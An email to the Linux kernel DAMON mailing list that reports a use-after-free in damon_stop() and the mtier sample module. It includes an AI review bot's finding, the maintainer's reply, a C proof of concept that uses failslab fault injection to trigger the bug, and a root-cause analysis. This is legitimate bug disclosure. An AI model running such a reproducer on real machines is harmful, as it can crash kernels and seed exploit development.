Received: from out203-205-221-242.mail.qq.com (out203-205-221-242.mail.qq.com [203.205.221.242])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 87BC51DDC2B
	for <damon@lists.linux.dev>; Thu, 11 Jun 2026 14:33:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.242
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781188388; cv=none; b=FBt3uEgSpXeLzw1uDy4TVYh5Ys/34f8+jZ+P/NxSw5XbE2P+57YIvDPVaXSnJmlhhtf+CF+SZORpJi+CvCGO07NtTWwRAFCrp6LCmu4iiuxd9fy65YVUD/PHljmag0MIzhC4HSDRrOx5XhGzIypdLV3avZniXWULQ2x/lpIgdBA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781188388; c=relaxed/simple;
	bh=HB7K+jVaZv27cy81EmFiJLFM4P1ClHwUSgR0KHUWFPA=;
	h=Message-ID:Date:MIME-Version:From:Subject:To:Cc:References:
	 In-Reply-To:Content-Type; b=itQZdM80yzBQli/WE8xguvVVDGiPn5h6UfzQ/6uyuqr/qQmU9xf4vSesDqn9pRFPF6oeTuJDO4TxPU+fPB0Pr+shJhX6/Yr01tcPKJOxSkR3v7m53xOMY2DvIe6LuHRCKWXTsVNdPDqP4m+jWHUKPM3Lub3eUV0QJdGyc1NTViw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=R5nN7avt; arc=none smtp.client-ip=203.205.221.242
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="R5nN7avt"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781188377; bh=GCDaKuGxRky1OF20sGbTfMxS2oYOT9Rm+psaVofsmUY=;
	h=Date:From:Subject:To:Cc:References:In-Reply-To;
	b=R5nN7avt2deSeu0eO8kiue4/E4LWRrW6SoUMeRBSxVmuF2C6IzdXTQGO46Ia3kr66
	 jREXcE4c02VEGDbR9J6+V/18nswQAwi/JyFr3qSPsLu0FZaHEOWQv31CEtz4QEHHdV
	 iQFs65+grwJutj5oQMvY+sJgH5tYD7EGuF+ak1DQ=
Received: from [198.18.0.1] ([115.156.144.140])
	by newxmesmtplogicsvrsza73-0.qq.com (NewEsmtp) with SMTP
	id 653B0A8F; Thu, 11 Jun 2026 22:25:19 +0800
X-QQ-mid: xmsmtpt1781187919t56gozc6v
Message-ID: <tencent_1B9710B1E0F61B5B50C2CA66799992F59009@qq.com>
X-QQ-XMAILINFO: Mv5lfVmQmUA4wrFGI53zI1fWqzgrAoTLbUxf3+7Mao3Kk8M9JEL/10HTo19YlE
	 JeNgpCp0UXeKakdY2a95reRwz7Iaa5Juq0Pw/U60PpG4mKCS1ogzDWfzSXD4vvDlyNwEvqS7KOwt
	 EsfdgW5vmpxyVzvhS3g2xv4EHXBgcPoEOPQg1Sx0Qlu6emIO8mT0H/eOEcC+FO4vfw7vy6hMynaQ
	 pX0iEuqVKynTMGwcWMt9RqDBUa6yy0v7CddNyIY3kHF/BbBD5FFHrS6MY7rxxre+4+OXHFUODHxH
	 oy95YfmIgbixS2Ga4EDJ/1yNIJwsT6a8PelUeyO8C8gsKWjAaNSCFtS0dJyF8IqA8FkWCj4Er3Jo
	 eoxWry1TPhFN3bsMl2RbI/xKKDFFvPySksjjyGBYpAikC1ulYxjzQkbazD8va1FhIikWWaiCPDsK
	 UyaFcFhByfjsR4CQ2DmOPWLmebMEUAxfLwMxzqQLIjhLENSHGDiq9CS02QHTMc80167RSraWxQLY
	 qM3H6lWmCO9RFAtuJaKARMfR4WYdK7r11LF+zmJWBz1/fu02MVSWFTnEQ487xXka4mf5qdru3Pa5
	 D92h/Wk/p1PR2A+YpvIdl+E5cYKj8zSsvLNe7cCg0u5WmzmqiLQlB7Z2XFnYKHOQ1j3VnTglQFIT
	 PC9LvSMrUrS4TDaLsvBigTnVIkfdbb+yuj3mh2d7F6yRSy6mDpjFuu7oIPLwnsdh/C4/WSKApGbw
	 F6b1UFssFBl1e1cjpoVTe5ts/k/lKkFbF3P7YpMk8qpReLP59DZinsTlcKy7F8YDfpLd0ObGR+Wc
	 JrqeSiGlnHFWSSWU56/XZTdDsSW/4aPpu8LyFNvVvYvE6KBKzy+TEf7sYdm6XtrjBvC3AjF3l1Xd
	 L6mN+IiXiVjOHvihX6kjGncvVT53tVkCuuhxaU3AMOK4M/fq5ZfVXZVvTxW14yvBfbyw0VmZ3ugt
	 ZjB31gtyvswbbFsf/llnA0+ySGwCTYl5c53Bf4FRPhEVZRM+DHVeqfQt2ulrVIwXCoc0xNC1pBTf
	 DrAlCJh58OcxV8cR3veFrK0BzNRj8JbHiNMlZY9JUXsjPFYGROjTz0dozF84A=
X-QQ-XMRINFO: MPJ6Tf5t3I/ylTmHUqvI8+Wpn+Gzalws3A==
X-OQ-MSGID: <73682011-0c51-470f-9f55-4b006dcc1534@qq.com>
Date: Thu, 11 Jun 2026 22:25:19 +0800
Precedence: bulk
X-Mailing-List: damon@lists.linux.dev
List-Id: <damon.lists.linux.dev>
List-Subscribe: <mailto:damon+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:damon+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
From: XIAO WU <xiaowu.417@qq.com>
Subject: Re: [RFC PATCH] samples/damon/mtier: handle damon_start() failure
To: SeongJae Park <sj@kernel.org>, sashiko-bot@kernel.org
Cc: damon@lists.linux.dev
References: <20260609014219.3013-1-sj@kernel.org>
In-Reply-To: <20260609014219.3013-1-sj@kernel.org>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi, I've written a Poc for this issues which may be helpful and Please 
see the details and the PoC code below:


On 9/6/26 9:42, SeongJae Park wrote:
> On Tue, 09 Jun 2026 01:06:15 +0000 sashiko-bot@kernel.org wrote:
> 
>> Thank you for your contribution! Sashiko AI review found 1 potential issue(s) to consider:
>>
>> Pre-existing issues:
>> - [High] `damon_stop()` aborts its loop on the first error, leaving subsequent contexts running and triggering a Use-After-Free when their memory is destroyed.
>> --
>>
>> commit 6da87efa9d6982132beff965026bf155183e5c93
>> Author: SeongJae Park <sj@kernel.org>
>>
>> samples/damon/mtier: handle damon_start() failure
>>
>> This commit adds cleanup for damon_start() failures in the memory tiering
>> DAMON module. When damon_start() fails, it stops any running contexts
>> and frees them to prevent memory leaks and exclusive mode locks.
>>
>> Link: https://lore.kernel.org/20260608112455.274231F00893@smtp.kernel.org
>>
>>> diff --git a/samples/damon/mtier.c b/samples/damon/mtier.c
>>> index eb1143de8df17..66b591f2180fa 100644
>>> --- a/samples/damon/mtier.c
>>> +++ b/samples/damon/mtier.c
>> [ ... ]
>>> @@ -185,7 +186,15 @@ static int damon_sample_mtier_start(void)
>>>   		return -ENOMEM;
>>>   	}
>>>   	ctxs[1] = ctx;
>>> -	return damon_start(ctxs, 2, true);
>>> +	err = damon_start(ctxs, 2, true);
>>> +	if (!err)
>>> +		return 0;
>>> +
>>> +	if (damon_is_running(ctxs[0]))
>>> +		damon_stop(ctxs, 1);
>>> +	damon_destroy_ctx(ctxs[0]);
>>> +	damon_destroy_ctx(ctxs[1]);
>>> +	return err;
>>>   }
>>>   
>>>   static void damon_sample_mtier_stop(void)
>>
>> [Severity: High]
>> This is a pre-existing issue,
> 
> So not a blocker of this patch.
> 
>> but does damon_stop() leave contexts running
>> and cause a use-after-free here?
>>
>> Looking at damon_stop() in mm/damon/core.c:
>>
>> int damon_stop(struct damon_ctx **ctxs, int nr_ctxs)
>> {
>> 	int i, err = 0;
>>
>> 	for (i = 0; i < nr_ctxs; i++) {
>> 		err = __damon_stop(ctxs[i]);
>> 		if (err)
>> 			break;
>> 	}
>> 	return err;
>> }
>>
>> If __damon_stop() returns an error for the first context (for instance, if
>> the kthread exited prematurely due to an allocation failure), the loop
>> breaks immediately.
>>
>> When damon_sample_mtier_stop() calls damon_stop(ctxs, 2), this would mean
>> ctxs[1] is never stopped if stopping ctxs[0] returns an error.
>>
>> The subsequent unconditional calls to damon_destroy_ctx(ctxs[1]) in
>> damon_sample_mtier_stop() would then free the context, its targets, and its
>> schemes while kdamond is still executing and dereferencing them.
>>
>> Can this lead to a use-after-free?
> 
> Makes sense.  I will separately work on this.
> 
> 
> Thanks,
> SJ
> 
> [...]

--- [PoC Start] ---

/*
  * POC for UAF in damon_sample_mtier
  *
  * Uses failslab to make kdamond_fn's kmalloc_array fail.
  * This causes kdamond to exit spontaneously, setting ctx->kdamond=NULL.
  * Then damon_sample_mtier_stop hits the break-early bug.
  */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define ENABLED_PATH "/sys/module/damon_sample_mtier/parameters/enabled"

static void wf(const char *path, const char *s)
{
	int fd = open(path, O_WRONLY);
	if (fd >= 0) { write(fd, s, strlen(s)); close(fd); }
}

int main(void)
{
	int i;
	
	/* Suppress verbose failslab messages */
	wf("/sys/kernel/debug/failslab/verbose", "0");
	wf("/sys/kernel/debug/failslab/verbose_ratelimit_burst", "10000");
	wf("/sys/kernel/debug/failslab/verbose_ratelimit_interval_ms", "60000");
	
	/* Enable failslab: 1% probability, unlimited fails */
	wf("/sys/kernel/debug/failslab/probability", "1");
	wf("/sys/kernel/debug/failslab/times", "-1");
	wf("/sys/kernel/debug/failslab/interval", "1");
	wf("/sys/kernel/debug/failslab/task-filter", "0");
	wf("/sys/kernel/debug/failslab/ignore-gfp-wait", "0");

	fprintf(stderr, "[poc] failslab: 1%% unlimited, verbose=0. Start loop\n");

	for (i = 0; i < 20000; i++) {
		int fd;
		fd = open(ENABLED_PATH, O_WRONLY);
		if (fd >= 0) {
			write(fd, "Y", 1);
			close(fd);
		}

		fd = open(ENABLED_PATH, O_WRONLY);
		if (fd >= 0) {
			write(fd, "N", 1);
			close(fd);
		}

		if ((i+1) % 2000 == 0)
			fprintf(stderr, "[poc] %d/20000\n", i+1);
	}

	wf("/sys/kernel/debug/failslab/probability", "0");
	wf("/sys/kernel/debug/failslab/times", "0");

	fprintf(stderr, "[poc] Done. Checking dmesg...\n");
	system("dmesg | grep -i -E 'BUG|KASAN|use-after-free|UAF|Oops|general 
protection|kernel BUG|WARNING' | tail -20");
	return 0;
}

--- [PoC End] ---

And some explanations here:

--- [EXPLANATIONS BEGIN] ---

1. Bug Summary

**Commit**: `6da87efa9d6982132beff965026bf155183e5c93` - 
"samples/damon/mtier: handle damon_start() failure"

**Bug Type**: Use-After-Free (UAF)

**Location**: `samples/damon/mtier.c` - `damon_sample_mtier_stop()`

2. Root Cause

The commit adds cleanup code in `damon_sample_mtier_start()` for when 
`damon_start()` fails:

```c
err = damon_start(ctxs, 2, true);
if (!err)
     return 0;

if (damon_is_running(ctxs[0]))
     damon_stop(ctxs, 1);
damon_destroy_ctx(ctxs[0]);
damon_destroy_ctx(ctxs[1]);
return err;
```

The bug: `damon_stop()` in `mm/damon/core.c` loops over contexts and 
breaks on the first error:

```c
int damon_stop(struct damon_ctx **ctxs, int nr_ctxs)
{
     int i, err = 0;
     for (i = 0; i < nr_ctxs; i++) {
         err = __damon_stop(ctxs[i]);
         if (err)
             break;
     }
     return err;
}
```

`__damon_stop()` returns `-EPERM` if `ctx->kdamond` is NULL (the kdamond 
thread already exited).

If ctxs[0]'s kdamond thread has already exited due to an internal 
failure (e.g., `kmalloc_array(GFP_KERNEL)` for `regions_score_histogram` 
fails inside `kdamond_fn`), then:
1. `damon_stop(ctxs, 2)` calls `__damon_stop(ctxs[0])` → returns -EPERM 
→ loop breaks
2. `__damon_stop(ctxs[1])` is **never called**
3. `damon_destroy_ctx(ctxs[1])` frees ctxs[1] while its kdamond thread 
is still running
4. The running kdamond continues dereferencing freed ctxs[1] memory → 
USE-AFTER-FREE

--- [EXPLANATIONS END] ---

To fix this, damon_stop() should probably not abort on the first error,
ensuring it iterates through all contexts to stop any surviving threads.
Hope this helps with the patch.

Best regards,
XIAO WU

